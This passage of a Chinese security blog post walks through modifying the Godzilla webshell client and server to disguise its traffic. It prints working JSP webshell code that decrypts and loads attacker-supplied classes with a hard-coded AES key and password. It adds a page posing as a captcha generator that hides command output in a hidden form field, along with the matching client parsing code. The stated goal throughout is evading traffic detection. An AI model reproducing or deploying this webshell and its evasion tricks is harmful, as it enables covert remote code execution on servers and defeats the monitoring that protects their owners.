                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164441932.png"
                      class="" title="image-20250317164441932"
                > 

<p>这里查询了whoami我就给打码了，毕竟加密参数都给大家看到了。<strong>可以看到状态码是404</strong> </p>
<h3 id="响应参数初步修改"><a href="#响应参数初步修改" class="headerlink" title="响应参数初步修改"></a>响应参数初步修改</h3><p>前面分析我们知道，客户端的解密是依据服务端的响应包加密，那我们先修改jsp里面的响应包内容</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317164736086.png"
                      class="" title="image-20250317164736086"
                >

<p> 先随便想一下，例如map形式，key:value <strong>My only love: 数据</strong></p>
<p>修改jsp代码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165220213.png"
                      class="" title="image-20250317165220213"
                > 

<p>别的都注释掉了，就保留了404状态码和响应包的输出</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165156279.png"
                      class="" title="image-20250317165156279"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165326856.png"
                      class="" title="image-20250317165326856"
                > 

<p>这里没有数据的原因是我们客户端无法解密接收到的参数</p>
<p>修改客户端的代码</p>
<p>JavaAesBase64_2.java</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317165415450.png"
                      class="" title="image-20250317165415450"
                > 

<p>客户端这里是可以从英文中看出寻找中间值，可以理解为我们之前就是md5+数据+md5，那提取中间的数据就好了，但是此时我们的是”My only love: 数据”，所以需要的是提取My only love:之后的字节</p>
<p>修改之后的样子,这里修改重要的点就是传输类型，接受的是byte[]，但是最后返回的是string，参考原来的subMiddleStr</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172555975.png"
                      class="" title="image-20250317172555975"
                > 

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public String findStr(byte[] respResult) &#123;</span><br><span class="line">        String htmlString = new String(respResult);</span><br><span class="line">//        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);</span><br><span class="line">        // 检查是否包含 &quot;My only love:&quot;</span><br><span class="line">        String prefix = &quot;My only love:&quot;;</span><br><span class="line">        // 如果字符串为空，直接返回 null</span><br><span class="line">        if (htmlString.isEmpty()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        // 提取 &quot;My only love:&quot; 之后的内容</span><br><span class="line">        if (htmlString.startsWith(prefix)) &#123;</span><br><span class="line">            return htmlString.substring(prefix.length());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Input does not start with &#x27;&quot; + prefix + &quot;&#x27;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172715962.png"
                      class="" title="image-20250317172715962"
                > 

<p>然后我们编译尝试连接，顺便看看数据包</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172752324.png"
                      class="" title="image-20250317172752324"
                > 

<p>执行whoami命令可以正确收到信息</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172835215.png"
                      class="" title="image-20250317172835215"
                > 

<p>看看数据包</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250317172923918.png"
                      class="" title="image-20250317172923918"
                > 

<p><strong>到此为止二开的一些基础操作步骤就完成了！！！，可以发挥想象力添加些参数以及响应包一些html格式去混淆流量</strong> </p>
<h2 id="响应包为验证码且隐藏参数"><a href="#响应包为验证码且隐藏参数" class="headerlink" title="响应包为验证码且隐藏参数"></a>响应包为验证码且隐藏参数</h2><p>由上面的学习思路可以知道，我们需要修改两个地方。</p>
<ul>
<li>webshell的响应response地方的输出</li>
<li>客户端findstr对response的输出进行提取，提取我们需要的数据，而不是所有返回的html</li>
</ul>
<h3 id="base64GlobalCode-bin-1"><a href="#base64GlobalCode-bin-1" class="headerlink" title="base64GlobalCode.bin"></a>base64GlobalCode.bin</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String code1;String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;pass&quot;; String md5=md5(pass+xc); class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125; public static String md5(String s) &#123;String ret = null;try &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();&#125; catch (Exception e) &#123;&#125;return ret; &#125; public static String base64Encode(byte[] bs) throws Exception &#123;Class base64;String value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125; public static byte[] base64Decode(String bs) throws Exception &#123;Class base64;byte[] value = null;try &#123;base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e) &#123;try &#123; base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);&#125; catch (Exception e2) &#123;&#125;&#125;return value; &#125;</span><br></pre></td></tr></table></figure></div>

<p>base64GlobalCode.bin其实只用修改一个地方，因为我们需要在html里面输出我们想要的数值，所以我们需要定一个一个全局变量去存储我们的输出</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319170245628.png"
                      class="" title="image-20250319170245628"
                > 

<p>就只多添加了一个这个</p>
<h3 id="base64Code-bin-1"><a href="#base64Code-bin-1" class="headerlink" title="base64Code.bin"></a>base64Code.bin</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    // 获取请求参数并进行Base64解码</span><br><span class="line">    byte[] data = base64Decode(request.getParameter(&quot;pass&quot;));</span><br><span class="line">    data = base64Decode(new String(data));  // 将 byte[] 转换为 String</span><br><span class="line">    data = x(data, false);</span><br><span class="line"></span><br><span class="line">    // 检查session中是否存在&quot;payload&quot;属性</span><br><span class="line">    if (session.getAttribute(&quot;payload&quot;) == null) &#123;</span><br><span class="line">        // 如果不存在，创建一个新的X类实例并存储到session中</span><br><span class="line">        session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 如果存在，执行以下逻辑</span><br><span class="line">        request.setAttribute(&quot;parameters&quot;, data);</span><br><span class="line"></span><br><span class="line">        // 创建一个ByteArrayOutputStream用于存储输出</span><br><span class="line">        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        // 从session中获取Class对象并创建其实例</span><br><span class="line">        Object f = ((Class) session.getAttribute(&quot;payload&quot;)).newInstance();</span><br><span class="line"></span><br><span class="line">        // 调用equals方法，可能用于触发某些逻辑</span><br><span class="line">        f.equals(arrOut);</span><br><span class="line">        f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">        // 向响应中写入MD5值的前16位</span><br><span class="line">        //response.getWriter().write(md5.substring(0, 16));</span><br><span class="line">        response.setStatus(404);</span><br><span class="line">        // 调用toString方法，可能用于触发某些逻辑</span><br><span class="line">        f.toString();</span><br><span class="line"></span><br><span class="line">        // 对arrOut的内容进行处理并进行Base64编码后写入响应</span><br><span class="line">        //response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));</span><br><span class="line"></span><br><span class="line">        // 写入MD5值的后16位</span><br><span class="line">        //response.getWriter().write(md5.substring(16));</span><br><span class="line">        code1=base64Encode(x(arrOut.toByteArray(), true));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    // 捕获异常，但不进行任何处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们知道之前我们的输出的数据是这一部份<strong>base64Encode(x(arrOut.toByteArray(), true))</strong> 所以我们可以将这个数据存储到全局变量code1中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319170439447.png"
                      class="" title="image-20250319170439447"
                > 

<p>最后在隐藏的数据中输出code1</p>
<h3 id="shell-jsp-1"><a href="#shell-jsp-1" class="headerlink" title="shell.jsp"></a>shell.jsp</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Base64&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.awt.*&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.awt.image.BufferedImage&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.imageio.ImageIO&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Random&quot; %&gt;</span><br><span class="line">&lt;%!&#123;globalCode&#125;%&gt;&lt;%&#123;code&#125;%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;验证码示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    // 创建一个 BufferedImage 对象</span><br><span class="line">    int width = 100;</span><br><span class="line">    int height = 40;</span><br><span class="line">    BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);</span><br><span class="line">    Graphics g = image.getGraphics();</span><br><span class="line"></span><br><span class="line">    // 设置背景颜色</span><br><span class="line">    g.setColor(Color.WHITE);</span><br><span class="line">    g.fillRect(0, 0, width, height);</span><br><span class="line"></span><br><span class="line">    // 设置字体</span><br><span class="line">    Font font = new Font(&quot;Arial&quot;, Font.BOLD, 20);</span><br><span class="line">    g.setFont(font);</span><br><span class="line"></span><br><span class="line">    // 设置验证码内容</span><br><span class="line">    String code = generateRandomCode();</span><br><span class="line">    g.setColor(Color.BLACK);</span><br><span class="line">    g.drawString(code, 10, 30);</span><br><span class="line"></span><br><span class="line">    // 添加干扰线</span><br><span class="line">    g.setColor(Color.GRAY);</span><br><span class="line">    for (int i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">        int x1 = new Random().nextInt(width);</span><br><span class="line">        int y1 = new Random().nextInt(height);</span><br><span class="line">        int x2 = new Random().nextInt(width);</span><br><span class="line">        int y2 = new Random().nextInt(height);</span><br><span class="line">        g.drawLine(x1, y1, x2, y2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将 BufferedImage 转换为 Base64 字符串</span><br><span class="line">    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">    ImageIO.write(image, &quot;png&quot;, baos);</span><br><span class="line">    byte[] bytes = baos.toByteArray();</span><br><span class="line">    String base64 = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;img src=&quot;data:image/png;base64,&lt;%= base64 %&gt;&quot; alt=&quot;验证码&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;captcha&quot; value=&quot;&lt;%= code1 %&gt;&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    // 生成随机验证码</span><br><span class="line">    private String generateRandomCode() &#123;</span><br><span class="line">        String chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;</span><br><span class="line">        StringBuilder code = new StringBuilder();</span><br><span class="line">        Random random = new Random();</span><br><span class="line">        for (int i = 0; i &lt; 4; i++) &#123;</span><br><span class="line">            code.append(chars.charAt(random.nextInt(chars.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        return code.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我在shell.jsp里面增加了图片验证码的生成代码，然后写一个hidden标签，把要输出的数据隐藏在里面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319170759636.png"
                      class="" title="image-20250319170759636"
                > 

<h3 id="JavaAesBase64-RspCaptcha-java"><a href="#JavaAesBase64-RspCaptcha-java" class="headerlink" title="JavaAesBase64_RspCaptcha.java"></a>JavaAesBase64_RspCaptcha.java</h3><p>修改找数据的地方</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319171656370.png"
                      class="" title="image-20250319171656370"
                > 

<p>可以使用正则去匹配</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public String findStr(byte[] respResult) &#123;</span><br><span class="line">        // 将字节数组转换为字符串</span><br><span class="line">        String htmlString = new String(respResult);</span><br><span class="line"></span><br><span class="line">        // 定义正则表达式，用于匹配 &lt;input type=&quot;hidden&quot;&gt; 标签的 value 属性</span><br><span class="line">        String regex = &quot;&lt;input\\s+type=\&quot;hidden\&quot;\\s+[^&gt;]*value=\&quot;([^\&quot;]*)\&quot;[^&gt;]*&gt;&quot;;</span><br><span class="line">        java.util.regex.Pattern pattern = java.util.regex.Pattern.compile(regex);</span><br><span class="line">        java.util.regex.Matcher matcher = pattern.matcher(htmlString);</span><br><span class="line"></span><br><span class="line">        // 如果找到匹配项，检查 value 属性的值是否为空</span><br><span class="line">        if (matcher.find()) &#123;</span><br><span class="line">            String value = matcher.group(1); // 获取 value 的值</span><br><span class="line">            if (value == null || value.trim().isEmpty()) &#123;</span><br><span class="line">                return null; // 如果 value 为空或仅包含空白字符，返回 null</span><br><span class="line">            &#125;</span><br><span class="line">            return value; // 返回 value 的值</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 如果没有找到匹配项，返回 null</span><br><span class="line">            return null; // 或者抛出异常：throw new IllegalArgumentException(&quot;No hidden input found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>就修改了这个地方</p>
<p>测试一下顺便看看数据包</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319172132536.png"
                      class="" title="image-20250319172132536"
                > 没有显示我们返回的数据

<p>数据隐藏在里面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319172315264.png"
                      class="" title="image-20250319172315264"
                > 

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/17/Godzilla%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/image-20250319172403561.png"
                      class="" title="image-20250319172403561"
                > 

<p>可以正常运行</p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> Godzilla二次开发</li>
        <li><strong>作者:</strong> Ro0ki1</li>
        <li><strong>创建于
                :</strong> 2025-03-17 15:56:51</li>
        
            <li>
                <strong>更新于
                    :</strong> 2025-03-25 14:44:11
            </li>
        
        <li>
            <strong>链接:</strong> https://ro0ki1.github.io/2025/03/17/Godzilla二次开发学习/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/%E5%B7%A5%E5%85%B7%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/">#工具二次开发</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/godzilla/">#godzilla</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">gophish钓鱼平台使用</span>
						<span class="post-nav-item">上一篇</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">spring框架bean加载漏洞</span>
						<span class="post-nav-item">下一篇</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">目录</div>
		<div class="page-title">Godzilla二次开发</div>
		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA"><span class="nav-text">项目搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BDgodzilla%E6%BA%90%E7%A0%81%E5%B9%B6%E4%B8%94%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-text">下载godzilla源码并且反编译</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="nav-text">目录结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E5%B7%A5%E4%BB%B6"><span class="nav-text">配置工件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="nav-text">二次开发的步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84"><span class="nav-text">项目结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E5%BB%BA%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%BF%90%E8%A1%8C"><span class="nav-text">构建代码并运行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#header%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9"><span class="nav-text">header特征修改</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E5%BE%81"><span class="nav-text">特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E7%89%B9%E5%BE%81"><span class="nav-text">修改特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-agent"><span class="nav-text">user-agent</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cookies"><span class="nav-text">cookies</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%EF%BC%88%E5%88%9D%E5%AD%A6AES-2%E6%AC%A1base64%EF%BC%89"><span class="nav-text">修改请求包的加密方式（初学AES+2次base64）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%8A%A0%E5%AF%86%E9%83%A8%E5%88%86%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="nav-text">分析加密部分目录结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E5%8A%A0%E4%B8%80%E6%AC%A1base64%E5%8A%A0%E5%AF%86"><span class="nav-text">多加一次base64加密</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%93%8D%E5%BA%94%E5%8C%85%E7%9A%84%E6%B5%81%E9%87%8F%EF%BC%88404-%E5%93%8D%E5%BA%94%E5%8F%82%E6%95%B0%E5%88%9D%E6%AD%A5%E4%BF%AE%E6%94%B9%EF%BC%89"><span class="nav-text">修改响应包的流量（404+响应参数初步修改）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#404"><span class="nav-text">404</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%8D%E5%BA%94%E5%8F%82%E6%95%B0%E5%88%9D%E6%AD%A5%E4%BF%AE%E6%94%B9"><span class="nav-text">响应参数初步修改</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%93%8D%E5%BA%94%E5%8C%85%E4%B8%BA%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%94%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0"><span class="nav-text">响应包为验证码且隐藏参数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#base64GlobalCode-bin-1"><span class="nav-text">base64GlobalCode.bin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base64Code-bin-1"><span class="nav-text">base64Code.bin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-jsp-1"><span class="nav-text">shell.jsp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaAesBase64-RspCaptcha-java"><span class="nav-text">JavaAesBase64_RspCaptcha.java</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2025</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ro0ki1</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共撰写了 14 篇文章
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
